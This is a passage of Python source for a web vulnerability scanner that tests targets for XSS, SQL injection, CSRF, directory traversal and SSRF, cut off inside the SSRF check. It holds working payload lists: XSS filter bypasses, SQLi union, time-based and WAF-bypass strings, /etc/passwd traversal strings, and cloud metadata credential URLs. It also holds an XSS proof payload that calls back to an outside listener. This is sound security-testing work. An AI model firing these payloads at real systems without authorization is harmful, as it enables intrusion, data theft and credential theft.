"""
Web vulnerability detection skill — probes for reflected XSS, SQL injection,
CSRF token issues, directory traversal, SSRF, SSTI, command injection,
open redirects, and sensitive file exposure on authorized targets.
"""

from __future__ import annotations

import json
import os
import re
import sys
import time
from dataclasses import dataclass, field, asdict
from pathlib import Path
from typing import Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse, quote

import requests
from bs4 import BeautifulSoup

sys.path.insert(0, str(Path(__file__).parent.parent))
from stealth import get_session, randomize_order, set_scan_seed
from http_baseline import capture_baseline, is_soft_404, Baseline
SESSION = get_session()


def _req():
    try:
        from scan_context import get_active_http_session

        s = get_active_http_session()
        if s is not None:
            return s
    except Exception:
        pass
    return SESSION

TIMEOUT = 5
TEST_TIME_BUDGET = 5   # max sec per test; 8 types * 5s = 40s + crawl keeps under 55s
RUN_BUDGET_SEC = 25   # exit before bot 120s; return partial results


def _budget_expired(start: float) -> bool:
    return (time.time() - start) > TEST_TIME_BUDGET


def _run_budget_expired(run_start: float) -> bool:
    return (time.time() - run_start) > RUN_BUDGET_SEC


# ---------------------------------------------------------------------------
# Data models
# ---------------------------------------------------------------------------

@dataclass
class Finding:
    title: str
    severity: str  # Critical / High / Medium / Low / Info
    url: str
    category: str
    evidence: str
    impact: str
    remediation: str
    cvss: str = ""
    finding_confidence: str = ""  # confirmed / likely / possible / informational


@dataclass
class WebVulnReport:
    target_url: str
    findings: list[Finding] = field(default_factory=list)
    pages_crawled: int = 0
    errors: list[str] = field(default_factory=list)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _inject_into_params(url: str, payload: str, param_filter: Optional[list[str]] = None):
    """Yield (param_name, test_url) for each injectable query parameter."""
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        return
    targets = param_filter if param_filter else list(params.keys())
    for pname in targets:
        if pname not in params:
            continue
        test_params = {k: v[0] for k, v in params.items()}
        test_params[pname] = payload
        yield pname, urlunparse(parsed._replace(query=urlencode(test_params)))


def _get_baseline(url: str) -> Optional[requests.Response]:
    try:
        return _req().get(url, timeout=TIMEOUT, allow_redirects=False)
    except requests.RequestException:
        return None


# ---------------------------------------------------------------------------
# Crawler — discovers pages and input points
# ---------------------------------------------------------------------------

def crawl(base_url: str, depth: int = 2, max_urls: int = 50) -> list[str]:
    """Same-origin BFS up to depth; caps URLs; includes form action targets."""
    visited: set[str] = set()
    to_visit = [base_url]
    domain = urlparse(base_url).netloc
    out: list[str] = []
    eff_depth = max(1, min(int(depth), 8))

    for _ in range(eff_depth):
        if len(out) >= max_urls:
            break
        next_level: list[str] = []
        for url in to_visit:
            if len(out) >= max_urls:
                break
            if url in visited:
                continue
            visited.add(url)
            out.append(url)
            try:
                resp = _req().get(url, timeout=TIMEOUT, allow_redirects=True)
                soup = BeautifulSoup(resp.text, "html.parser")
                for link in soup.find_all("a", href=True):
                    abs_url = urljoin(url, link["href"])
                    pu = urlparse(abs_url)
                    if pu.netloc == domain and abs_url not in visited and abs_url not in next_level:
                        next_level.append(abs_url)
                for form in soup.find_all("form"):
                    act = form.get("action")
                    if not act:
                        continue
                    abs_url = urljoin(url, act)
                    if urlparse(abs_url).netloc == domain and abs_url not in visited and abs_url not in next_level:
                        next_level.append(abs_url)
            except requests.RequestException:
                continue
        to_visit = next_level

    return out[:max_urls]


# ---------------------------------------------------------------------------
# XSS detection
# ---------------------------------------------------------------------------

XSS_PAYLOADS = [
    # --- Reflected: basic ---
    '<script>alert("XSS")</script>',
    "<script>alert(String.fromCharCode(88,83,83))</script>",
    "<script>confirm(1)</script>",
    "<script>prompt(1)</script>",
    # --- Event handlers ---
    '"><img src=x onerror=alert(1)>',
    "'-alert(1)-'",
    '<body onload=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '<marquee onstart=alert(1)>',
    '<video><source onerror="alert(1)">',
    '<audio src=x onerror=alert(1)>',
    '<details open ontoggle=alert(1)>',
    '<select onfocus=alert(1) autofocus>',
    '<textarea onfocus=alert(1) autofocus>',
    # --- SVG ---
    "<svg/onload=alert(1)>",
    '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
    '<svg><set onbegin=alert(1) attributename=x to=1>',
    # --- DOM-based / protocol ---
    "javascript:alert(1)",
    "data:text/html,<script>alert(1)</script>",
    "javascript:alert(document.domain)",
    # --- Polyglots ---
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    '"><svg/onload=alert(1)//',
    "\"><img src=x onerror=alert(1)>",
    "';alert(1)//",
    # --- Encoded variants: HTML entity ---
    "&#60;script&#62;alert(1)&#60;/script&#62;",
    "&lt;script&gt;alert(1)&lt;/script&gt;",
    # --- Encoded variants: URL encode ---
    "%3Cscript%3Ealert(1)%3C%2Fscript%3E",
    "%3Csvg%20onload%3Dalert(1)%3E",
    # --- Encoded variants: Unicode ---
    "<script>\\u0061lert(1)</script>",
    # --- Filter bypass: case variation ---
    "<ScRiPt>alert(1)</ScRiPt>",
    "<IMG SRC=x ONERROR=alert(1)>",
    # --- Filter bypass: null bytes ---
    "<scr%00ipt>alert(1)</scr%00ipt>",
    # --- Filter bypass: double encoding ---
    "%253Cscript%253Ealert(1)%253C%252Fscript%253E",
    # --- CSP bypass attempts ---
    "<base href='javascript:/a/-alert(1)///////'>",
    "<object data='data:text/html,<script>alert(1)</script>'>",
    "<link rel=import href='data:text/html,<script>alert(1)</script>'>",
]

XSS_REFLECTION_PATTERNS = [
    re.compile(r"<script[^>]*>.*?alert\s*\(", re.IGNORECASE | re.DOTALL),
    re.compile(r"<img\b[^>]*onerror\s*=\s*alert\s*\(", re.IGNORECASE),
    re.compile(r"<svg[^>]*onload\s*=\s*alert\s*\(", re.IGNORECASE),
    re.compile(r"<body\b[^>]*onload\s*=\s*alert\s*\(", re.IGNORECASE),
    re.compile(r"<input\b[^>]*onfocus\s*=\s*alert\s*\(", re.IGNORECASE),
    re.compile(r"<details\b[^>]*ontoggle\s*=\s*alert\s*\(", re.IGNORECASE),
    re.compile(r"<video\b[^>]*onerror\s*=", re.IGNORECASE),
    re.compile(r"<audio\b[^>]*onerror\s*=", re.IGNORECASE),
    re.compile(r"<marquee\b[^>]*onstart\s*=", re.IGNORECASE),
    re.compile(r"<select\b[^>]*onfocus\s*=", re.IGNORECASE),
    re.compile(r"<textarea\b[^>]*onfocus\s*=", re.IGNORECASE),
    re.compile(r"<base\b[^>]*href\s*=\s*['\"]?javascript:", re.IGNORECASE),
    re.compile(r"<object\b[^>]*data\s*=\s*['\"]?data:", re.IGNORECASE),
    re.compile(r"javascript:\s*alert\s*\(", re.IGNORECASE),
    re.compile(r"confirm\s*\(\s*1\s*\)", re.IGNORECASE),
    re.compile(r"prompt\s*\(\s*1\s*\)", re.IGNORECASE),
]

# Optional callback URL for XSS execution proof. If set, we send a proof payload that triggers a GET to this URL when executed in a browser.
XSS_CALLBACK_URL = os.environ.get("DIVERG_XSS_CALLBACK_URL", "").strip()

_NON_EXEC_PARENTS = {"title", "textarea", "style", "noscript", "noframes"}


def _xss_in_executable_context(resp_text: str, payload: str) -> bool:
    """Return True only if *payload* appears in an executable HTML context.

    Rejects reflections that are entity-encoded, inside HTML comments,
    or inside non-executable elements like <title>, <textarea>, <style>.
    """
    try:
        soup = BeautifulSoup(resp_text, "html.parser")
    except Exception:
        return False

    payload_lower = payload.lower()
    text_lower = resp_text.lower()

    if payload_lower not in text_lower:
        return False

    for comment in soup.find_all(string=lambda t: isinstance(t, type(soup.new_string(""))) is False):
        pass

    from bs4 import Comment
    for comment in soup.find_all(string=lambda text: isinstance(text, Comment)):
        if payload_lower in str(comment).lower():
            return False

    for tag_name in _NON_EXEC_PARENTS:
        for tag in soup.find_all(tag_name):
            if payload_lower in tag.get_text().lower():
                return False

    for script in soup.find_all("script"):
        if payload_lower in str(script).lower():
            return True

    for tag in soup.find_all(True):
        for attr_name, attr_val in (tag.attrs or {}).items():
            if attr_name.lower().startswith("on"):
                val_str = attr_val if isinstance(attr_val, str) else " ".join(attr_val)
                if payload_lower in val_str.lower() or "alert" in val_str.lower():
                    return True
            if attr_name.lower() in ("href", "src", "data", "action") and isinstance(attr_val, str):
                if attr_val.strip().lower().startswith("javascript:"):
                    return True

    tag_patterns = [
        re.compile(r"<(?:img|svg|body|audio|video|details|marquee|select|textarea|input)\b[^>]*\bon\w+\s*=", re.IGNORECASE),
        re.compile(r"<script\b", re.IGNORECASE),
    ]
    for pat in tag_patterns:
        match = pat.search(resp_text)
        if match:
            region = resp_text[max(0, match.start() - 10):match.end() + 200]
            if payload[:20].lower() in region.lower():
                return True

    return False


def test_xss(url: str) -> list[Finding]:
    findings: list[Finding] = []
    _t0 = time.time()
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        return findings

    for param_name in params:
        if _budget_expired(_t0):
            return findings
        for payload in randomize_order(XSS_PAYLOADS):
            test_params = {k: v[0] for k, v in params.items()}
            test_params[param_name] = payload
            test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

            try:
                resp = _req().get(test_url, timeout=TIMEOUT, allow_redirects=False)
                for pattern in XSS_REFLECTION_PATTERNS:
                    if pattern.search(resp.text):
                        executable = _xss_in_executable_context(resp.text, payload)
                        evidence_extra = ""
                        if executable and XSS_CALLBACK_URL and not _budget_expired(_t0):
                            proof_payload = '<img src=x onerror="fetch(\'' + XSS_CALLBACK_URL + '?xss_proof=1\')">'
                            proof_params = {k: v[0] for k, v in params.items()}
                            proof_params[param_name] = proof_payload
                            proof_url = urlunparse(parsed._replace(query=urlencode(proof_params)))
                            try:
                                _req().get(proof_url, timeout=TIMEOUT, allow_redirects=False)
                                evidence_extra = " Proof: callback payload sent; verify receipt at your listener for execution proof."
                            except requests.RequestException:
                                evidence_extra = " Proof: callback URL configured but proof request failed."

                        if executable:
                            tag = "[CONFIRMED]"
                            sev = "High"
                            conf_note = "Payload reflected in executable HTML context."
                            fc = "confirmed"
                        else:
                            tag = "[REFLECTED - verify manually]"
                            sev = "Medium"
                            conf_note = "Payload reflected but not in a clearly executable context (may be encoded, commented, or in non-script element)."
                            fc = "possible"

                        findings.append(Finding(
                            title=f"Reflected XSS via parameter '{param_name}' {tag}",
                            severity=sev,
                            url=test_url,
                            category="OWASP-A03 Injection (XSS)",
                            evidence=f"Payload: {payload}\n{conf_note} Matched: {pattern.pattern[:60]}.{evidence_extra}",
                            impact="An attacker could execute arbitrary JavaScript in victim browsers, steal session cookies, or deface pages.",
                            remediation="Sanitize and output-encode all user-supplied input before rendering in HTML. Implement a strict Content-Security-Policy.",
                            cvss="6.1 (Medium)",
                            finding_confidence=fc,
                        ))
                        return findings
            except requests.RequestException:
                continue
    return findings


# ---------------------------------------------------------------------------
# SQL injection detection
# ---------------------------------------------------------------------------

SQLI_ERROR_PATTERNS = [
    re.compile(r"you have an error in your sql syntax", re.IGNORECASE),
    re.compile(r"mysql_fetch|mysql_num_rows|mysql_query", re.IGNORECASE),
    re.compile(r"Warning.*?\Wmysqli?_", re.IGNORECASE),
    re.compile(r"PostgreSQL.*?ERROR", re.IGNORECASE),
    re.compile(r"pg_query|pg_exec|pg_prepare", re.IGNORECASE),
    re.compile(r"unterminated quoted string", re.IGNORECASE),
    re.compile(r"ORA-\d{5}", re.IGNORECASE),
    re.compile(r"Oracle.*?Driver", re.IGNORECASE),
    re.compile(r"quoted string not properly terminated", re.IGNORECASE),
    re.compile(r"Microsoft.*?ODBC.*?Driver", re.IGNORECASE),
    re.compile(r"SQL Server.*?Error", re.IGNORECASE),
    re.compile(r"Unclosed quotation mark", re.IGNORECASE),
    re.compile(r"\[Microsoft\]\[ODBC SQL Server Driver\]", re.IGNORECASE),
    re.compile(r"mssql_query", re.IGNORECASE),
    re.compile(r"sqlite3\.OperationalError", re.IGNORECASE),
    re.compile(r"SQLite/JDBCDriver", re.IGNORECASE),
    re.compile(r"near \".*?\": syntax error", re.IGNORECASE),
    re.compile(r"com\.mysql\.jdbc", re.IGNORECASE),
    re.compile(r"org\.postgresql\.util\.PSQLException", re.IGNORECASE),
    re.compile(r"java\.sql\.SQLException", re.IGNORECASE),
    re.compile(r"SQLSTATE\[\w+\]", re.IGNORECASE),
    re.compile(r"PDOException", re.IGNORECASE),
    re.compile(r"on line \d+ .*?sql", re.IGNORECASE),
]

SQLI_PAYLOADS_ERROR = [
    "'",
    "\"",
    "';",
    "\";",
    "') --",
    "1'1",
    "1 AND 1=1",
    "' OR ''='",
    "1' OR '1'='1",
    "1\" OR \"1\"=\"1",
    "' OR 1=1--",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin'--",
    "1' AND '1'='2",
    "' HAVING 1=1--",
    "' GROUP BY 1--",
    "1' ORDER BY 100--",
    "' AND 1=CONVERT(int,(SELECT @@version))--",
    "' AND 1=CAST((SELECT version()) AS int)--",
    "' AND extractvalue(1,concat(0x7e,version()))--",
    "' AND updatexml(1,concat(0x7e,version()),1)--",
]

SQLI_PAYLOADS_UNION = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT username,password,3 FROM users--",
    "1 UNION ALL SELECT 1,@@version,3--",
    "1 UNION ALL SELECT 1,table_name,3 FROM information_schema.tables--",
]

SQLI_PAYLOADS_BOOLEAN = [
    ("' AND 1=1--", "' AND 1=2--"),
    ("' AND 'a'='a'--", "' AND 'a'='b'--"),
    ("1 AND 1=1", "1 AND 1=2"),
    ("' OR 1=1--", "' OR 1=2--"),
    ("1) AND 1=1--", "1) AND 1=2--"),
    ("') AND 1=1--", "') AND 1=2--"),
]

SQLI_PAYLOADS_TIME = [
    ("' AND SLEEP(3)--", 3),
    ("'; WAITFOR DELAY '0:0:3'--", 3),
    ("' AND pg_sleep(3)--", 3),
    ("1; WAITFOR DELAY '0:0:3'--", 3),
    ("1 AND SLEEP(3)--", 3),
    ("1) AND SLEEP(3)--", 3),
    ("') AND SLEEP(3)--", 3),
    ("';SELECT SLEEP(3)--", 3),
    ("1; SELECT pg_sleep(3)--", 3),
    ("' OR SLEEP(3)--", 3),
    ("1 OR SLEEP(3)#", 3),
    ("1);WAITFOR DELAY '0:0:3'--", 3),
]

SQLI_PAYLOADS_WAF_BYPASS = [
    "1'/**/OR/**/1=1--",
    "1'%09OR%091=1--",
    "1' /*!50000OR*/ 1=1--",
    "1'%0aOR%0a1=1--",
    "1' oR 1=1--",
    "1'||'1'='1",
    "1' AnD 1=1--",
    "1'%00' OR 1=1--",
    "1' OR 1=1--%0a",
    "1'%252f%252a*/OR/**/1=1--",
    "1' /*!OR*/ 1=1--",
    "1'/**/UNION/**/SELECT/**/NULL--",
]

SQLI_PAYLOADS_STACKED = [
    "'; SELECT 1;--",
    "'; SELECT version();--",
    "'; SELECT @@version;--",
    "1; DROP TABLE test_nonexistent;--",
    "1; SELECT pg_sleep(0);--",
]

# Proof: try to extract a known value (DB version) to confirm exploitability
SQLI_EXTRACT_PAYLOADS = [
    "' UNION SELECT 1,version(),3--",
    "' UNION SELECT 1,@@version,3--",
    "' UNION SELECT 1,sqlite_version(),3--",
    "' UNION SELECT NULL,version(),NULL--",
    "1 UNION SELECT 1,@@version,3--",
]
VERSION_PATTERN = re.compile(r"(\d{1,2}\.\d{1,2}(?:\.\d{1,4})?(?:-\w+)?)")


def _try_sqli_extract(url: str, param_name: str) -> str:
    """Try extraction payloads; return first version-like string found in response, or empty string."""
    for payload in SQLI_EXTRACT_PAYLOADS[:3]:
        for _pn, test_url in _inject_into_params(url, payload, [param_name]):
            try:
                resp = _req().get(test_url, timeout=TIMEOUT, allow_redirects=False)
                if resp.status_code != 200:
                    continue
                # Look for version-like string (x.y.z) in response
                match = VERSION_PATTERN.search(resp.text)
                if match:
                    ver = match.group(1)
                    if 1 <= len(ver) <= 25 and ver.count(".") >= 1:
                        return ver
            except requests.RequestException:
                continue
    return ""


def test_sqli(url: str) -> list[Finding]:
    findings: list[Finding] = []
    _t0 = time.time()
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        return findings

    baseline = _get_baseline(url)
    baseline_len = len(baseline.text) if baseline else 0

    for param_name in params:
        if _budget_expired(_t0):
            return findings
        # --- Error-based ---
        for payload in randomize_order(SQLI_PAYLOADS_ERROR):
            for pn, test_url in _inject_into_params(url, payload, [param_name]):
                try:
                    resp = _req().get(test_url, timeout=TIMEOUT, allow_redirects=False)
                    for pat in SQLI_ERROR_PATTERNS:
                        if pat.search(resp.text):
                            if baseline and pat.search(baseline.text):
                                continue
                            proof = _try_sqli_extract(url, pn)
                            if proof:
                                tag = "[CONFIRMED]"
                                fc = "confirmed"
                                conf_note = f"Proof: extracted DB version: {proof}."
                            else:
                                tag = "[LIKELY]"
                                fc = "likely"
                                conf_note = "DB error pattern matched; extraction not confirmed."
                            evidence = (
                                f"Payload: {payload}\nDB error pattern in response: {pat.pattern[:80]}\n{conf_note}"
                            )
                            findings.append(Finding(
                                title=f"SQL Injection (error-based) via '{pn}' {tag}",
                                severity="Critical",
                                url=test_url,
                                category="OWASP-A03 Injection (SQLi)",
                                evidence=evidence,
                                impact="An attacker could read, modify, or delete database contents and potentially execute OS commands.",
                                remediation="Use parameterized queries / prepared statements. Never concatenate user input into SQL.",
                                cvss="9.8 (Critical)",
                                finding_confidence=fc,
                            ))
                            return findings
                except requests.RequestException:
                    continue

        # --- UNION-based ---
        if _budget_expired(_t0):
            return findings
        for payload in randomize_order(SQLI_PAYLOADS_UNION):
            for pn, test_url in _inject_into_params(url, payload, [param_name]):
                try:
                    resp = _req().get(test_url, timeout=TIMEOUT, allow_redirects=False)
                    for pat in SQLI_ERROR_PATTERNS:
                        if pat.search(resp.text):
                            findings.append(Finding(
                                title=f"SQL Injection (UNION-based) via '{pn}'",
                                severity="Critical",
                                url=test_url,
                                category="OWASP-A03 Injection (SQLi)",
                                evidence=f"Payload: {payload}\nDB error in response indicates UNION injection point",
                                impact="An attacker could extract arbitrary data from the database via UNION queries.",
                                remediation="Use parameterized queries / prepared statements. Never concatenate user input into SQL.",
                                cvss="9.8 (Critical)",
                            ))
                            return findings
                    if baseline and abs(len(resp.text) - baseline_len) > 200:
                        col_match = re.search(r"UNION.*?SELECT\s+((?:NULL,?\s*)+)", payload, re.IGNORECASE)
                        if col_match:
                            findings.append(Finding(
                                title=f"Possible SQL Injection (UNION-based) via '{pn}'",
                                severity="High",
                                url=test_url,
                                category="OWASP-A03 Injection (SQLi)",
                                evidence=f"Payload: {payload}\nResponse length changed significantly ({baseline_len} -> {len(resp.text)})",
                                impact="An attacker may be able to extract data via UNION-based SQLi.",
                                remediation="Use parameterized queries / prepared statements.",
                                cvss="9.8 (Critical)",
                            ))
                            return findings
                except requests.RequestException:
                    continue

        # --- Boolean blind (retry to confirm consistency) ---
        if _budget_expired(_t0):
            return findings
        for true_payload, false_payload in randomize_order(SQLI_PAYLOADS_BOOLEAN):
            for pn, true_url in _inject_into_params(url, true_payload, [param_name]):
                false_url = None
                for _, fu in _inject_into_params(url, false_payload, [param_name]):
                    false_url = fu
                    break
                if not false_url:
                    continue
                try:
                    resp_true = _req().get(true_url, timeout=TIMEOUT, allow_redirects=False)
                    resp_false = _req().get(false_url, timeout=TIMEOUT, allow_redirects=False)
                    len_diff = abs(len(resp_true.text) - len(resp_false.text))
                    if len_diff > 50 and baseline:
                        true_like_baseline = abs(len(resp_true.text) - baseline_len) < abs(len(resp_false.text) - baseline_len)
                        if true_like_baseline:
                            resp_true2 = _req().get(true_url, timeout=TIMEOUT, allow_redirects=False)
                            resp_false2 = _req().get(false_url, timeout=TIMEOUT, allow_redirects=False)
                            len_diff2 = abs(len(resp_true2.text) - len(resp_false2.text))
                            if len_diff2 < 30:
                                continue
                            proof = _try_sqli_extract(url, pn)
                            if proof:
                                tag = "[CONFIRMED]"
                                sev = "Critical"
                                fc = "confirmed"
                                conf_note = f"Confirmed via consistent boolean diff and extraction (version: {proof})."
                            else:
                                tag = "[POSSIBLE]"
                                sev = "Medium"
                                fc = "possible"
                                conf_note = "[Needs manual verification] Consistent boolean response diff observed but no data extraction."
                            findings.append(Finding(
                                title=f"Blind SQL Injection (boolean) via '{pn}' {tag}",
                                severity=sev,
                                url=true_url,
                                category="OWASP-A03 Injection (SQLi)",
                                evidence=f"True/False payloads tested; response length diff: {len_diff}/{len_diff2} bytes (consistent). {conf_note}",
                                impact="An attacker could extract database contents one bit at a time via boolean inference if confirmed.",
                                remediation="Use parameterized queries / prepared statements.",
                                cvss="9.8 (Critical)",
                                finding_confidence=fc,
                            ))
                            return findings
                except requests.RequestException:
                    continue

        # --- Time-based blind (baseline comparison + retry) ---
        if _budget_expired(_t0):
            return findings
        for payload, delay in randomize_order(SQLI_PAYLOADS_TIME):
            for pn, test_url in _inject_into_params(url, payload, [param_name]):
                try:
                    start_bl = time.time()
                    _req().get(url, timeout=TIMEOUT, allow_redirects=False)
                    baseline_time = time.time() - start_bl

                    start = time.time()
                    _req().get(test_url, timeout=TIMEOUT + delay + 2, allow_redirects=False)
                    elapsed = time.time() - start

                    if elapsed < delay * 0.8:
                        continue
                    if elapsed < baseline_time + (delay * 0.7):
                        continue

                    start2 = time.time()
                    _req().get(test_url, timeout=TIMEOUT + delay + 2, allow_redirects=False)
                    elapsed2 = time.time() - start2

                    if elapsed2 < delay * 0.8:
                        continue

                    tag = "[LIKELY]"
                    sev = "High"
                    fc = "likely"
                    conf_note = f"[Needs manual verification] Delay observed twice ({elapsed:.1f}s, {elapsed2:.1f}s vs baseline {baseline_time:.1f}s)."

                    findings.append(Finding(
                        title=f"Blind SQL Injection (time-based) via '{pn}' {tag}",
                        severity=sev,
                        url=test_url,
                        category="OWASP-A03 Injection (SQLi)",
                        evidence=f"Payload: {payload}\n{conf_note}",
                        impact="An attacker could extract database contents via time-based inference.",
                        remediation="Use parameterized queries / prepared statements.",
                        cvss="9.8 (Critical)",
                        finding_confidence=fc,
                    ))
                    return findings
                except requests.RequestException:
                    continue

        # --- WAF bypass ---
        if _budget_expired(_t0):
            return findings
        for payload in randomize_order(SQLI_PAYLOADS_WAF_BYPASS):
            for pn, test_url in _inject_into_params(url, payload, [param_name]):
                try:
                    resp = _req().get(test_url, timeout=TIMEOUT, allow_redirects=False)
                    for pat in SQLI_ERROR_PATTERNS:
                        if pat.search(resp.text):
                            findings.append(Finding(
                                title=f"SQL Injection (WAF bypass) via '{pn}'",
                                severity="Critical",
                                url=test_url,
                                category="OWASP-A03 Injection (SQLi)",
                                evidence=f"Payload: {payload}\nDB error leaked despite WAF — filter bypass successful",
                                impact="WAF/filter bypass allows full SQL injection exploitation.",
                                remediation="Use parameterized queries. WAFs are not a substitute for secure coding practices.",
                                cvss="9.8 (Critical)",
                            ))
                            return findings
                except requests.RequestException:
                    continue

        # --- Stacked queries ---
        if _budget_expired(_t0):
            return findings
        for payload in randomize_order(SQLI_PAYLOADS_STACKED):
            for pn, test_url in _inject_into_params(url, payload, [param_name]):
                try:
                    resp = _req().get(test_url, timeout=TIMEOUT, allow_redirects=False)
                    for pat in SQLI_ERROR_PATTERNS:
                        if pat.search(resp.text):
                            findings.append(Finding(
                                title=f"SQL Injection (stacked queries) via '{pn}'",
                                severity="Critical",
                                url=test_url,
                                category="OWASP-A03 Injection (SQLi)",
                                evidence=f"Payload: {payload}\nDB error on stacked query indicates multiple-statement execution",
                                impact="Stacked query injection can allow arbitrary SQL execution including data modification.",
                                remediation="Use parameterized queries. Disable multi-statement execution if possible.",
                                cvss="9.8 (Critical)",
                            ))
                            return findings
                except requests.RequestException:
                    continue

    return findings


# ---------------------------------------------------------------------------
# CSRF detection
# ---------------------------------------------------------------------------

def test_csrf(url: str) -> list[Finding]:
    findings: list[Finding] = []
    try:
        resp = _req().get(url, timeout=TIMEOUT)
        soup = BeautifulSoup(resp.text, "html.parser")

        forms = soup.find_all("form", method=re.compile(r"post", re.IGNORECASE))
        for form in forms:
            action = form.get("action", url)
            abs_action = urljoin(url, action)
            inputs = form.find_all("input")
            input_names = [inp.get("name", "").lower() for inp in inputs]

            has_csrf_token = any(
                tok in name
                for name in input_names
                for tok in ("csrf", "token", "_token", "xsrf", "authenticity_token", "nonce")
            )

            if not has_csrf_token:
                findings.append(Finding(
                    title="POST form missing CSRF token",
                    severity="Medium",
                    url=url,
                    category="OWASP-A01 Broken Access Control (CSRF)",
                    evidence=f"Form action: {abs_action}\nInput fields: {', '.join(input_names)}\nNo CSRF token field detected",
                    impact="An attacker could forge cross-site requests to perform actions on behalf of authenticated users.",
                    remediation="Add a unique, unpredictable CSRF token to every state-changing form and validate it server-side.",
                    cvss="4.3 (Medium)",
                ))
    except requests.RequestException:
        pass
    return findings


# ---------------------------------------------------------------------------
# Directory traversal detection
# ---------------------------------------------------------------------------

TRAVERSAL_PAYLOADS = [
    ("../../../etc/passwd", ["root:", "/bin/bash", "/bin/sh"]),
    ("..\\..\\..\\windows\\win.ini", ["[extensions]", "[fonts]"]),
    ("....//....//....//etc/passwd", ["root:", "/bin/bash"]),
    ("%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", ["root:", "/bin/bash"]),
    ("..%252f..%252f..%252fetc%252fpasswd", ["root:", "/bin/bash"]),
    ("..%c0%af..%c0%af..%c0%afetc/passwd", ["root:", "/bin/bash"]),
    ("..%255c..%255c..%255cwindows%255cwin.ini", ["[extensions]", "[fonts]"]),
    ("/etc/passwd%00.jpg", ["root:", "/bin/bash"]),
    ("....\\....\\....\\etc\\passwd", ["root:", "/bin/bash"]),
    ("..%5c..%5c..%5cwindows%5cwin.ini", ["[extensions]", "[fonts]"]),
]


def test_traversal(url: str) -> list[Finding]:
    findings: list[Finding] = []
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        return findings

    file_params = [p for p in params if any(kw in p.lower() for kw in
                   ("file", "path", "page", "doc", "template", "include", "dir", "folder", "load"))]
    if not file_params:
        file_params = list(params.keys())

    for param_name in file_params:
        for payload, indicators in randomize_order(TRAVERSAL_PAYLOADS):
            test_params = {k: v[0] for k, v in params.items()}
            test_params[param_name] = payload
            test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

            try:
                resp = _req().get(test_url, timeout=TIMEOUT, allow_redirects=False)
                body_lower = resp.text.lower()
                if any(ind.lower() in body_lower for ind in indicators):
                    findings.append(Finding(
                        title=f"Directory Traversal via parameter '{param_name}'",
                        severity="High",
                        url=test_url,
                        category="OWASP-A01 Broken Access Control (Path Traversal)",
                        evidence=f"Payload: {payload}\nOS file content detected in response",
                        impact="An attacker could read arbitrary files from the server filesystem.",
                        remediation="Validate and sanitize file path parameters. Use allowlists and chroot jails.",
                        cvss="7.5 (High)",
                    ))
                    return findings
            except requests.RequestException:
                continue
    return findings


# ---------------------------------------------------------------------------
# SSRF detection
# ---------------------------------------------------------------------------

SSRF_TARGETS = [
    ("http://127.0.0.1/", "localhost/loopback response"),
    ("http://localhost/", "localhost response"),
    ("http://[::1]/", "IPv6 loopback"),
    ("http://0.0.0.0/", "zero address"),
    ("http://169.254.169.254/latest/meta-data/", "AWS EC2 metadata"),
    ("http://169.254.169.254/computeMetadata/v1/", "GCP metadata"),
    ("http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure metadata"),
    ("http://100.100.100.200/latest/meta-data/", "Alibaba Cloud metadata"),
    ("http://169.254.170.2/v2/credentials", "AWS ECS task credentials"),
    ("http://127.0.0.1:22/", "local SSH port"),
    ("http://127.0.0.1:3306/", "local MySQL port"),
    ("http://127.0.0.1:6379/", "local Redis port"),
    ("http://127.0.0.1:8080/", "local alt-HTTP port"),
    ("http://2130706433/", "decimal IP for 127.0.0.1"),
    ("http://0x7f000001/", "hex IP for 127.0.0.1"),
    ("http://017700000001/", "octal IP for 127.0.0.1"),
]

SSRF_INDICATORS = [
    re.compile(r"ami-[0-9a-f]+", re.IGNORECASE),
    re.compile(r"instance-id", re.IGNORECASE),
    re.compile(r"local-ipv4", re.IGNORECASE),
    re.compile(r"meta-data", re.IGNORECASE),
    re.compile(r"security-credentials", re.IGNORECASE),
    re.compile(r"AccessKeyId", re.IGNORECASE),
    re.compile(r"SecretAccessKey", re.IGNORECASE),
    re.compile(r"iam/", re.IGNORECASE),
    re.compile(r"hostname", re.IGNORECASE),
    re.compile(r"SSH-\d", re.IGNORECASE),
    re.compile(r"redis_version", re.IGNORECASE),
    re.compile(r"mysql_native_password", re.IGNORECASE),
]

SSRF_PARAM_NAMES = ["url", "uri", "src", "source", "href", "link", "redirect",
                     "target", "dest", "destination", "fetch", "site", "feed",
                     "host", "domain", "callback", "return", "next", "data",
                     "load", "page", "to", "out", "view", "dir", "path"]


def test_ssrf(url: str) -> list[Finding]:
    findings: list[Finding] = []
    _t0 = time.time()
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    if not params:
        return findings

    candidate_params = [p for p in params if p.lower() in SSRF_PARAM_NAMES]
    if not candidate_params:
        candidate_params = list(params.keys())

    baseline = _get_baseline(url)

    for param_name in candidate_params:
        if _budget_expired(_t0):
            return findings
        for ssrf_url, label in randomize_order(SSRF_TARGETS):
            for pn, test_url in _inject_into_params(url, ssrf_url, [param_name]):
                try:
                    resp = _req().get(test_url, timeout=TIMEOUT, allow_redirects=False)

                    for indicator in SSRF_INDICATORS:
                        if indicator.search(resp.text):
                            findings.append(Finding(
                                title=f"Server-Side Request Forgery via '{pn}'",
                                severity="Critical" if "metadata" in label.lower() or "credential" in label.lower() else "High",
                                url=test_url,
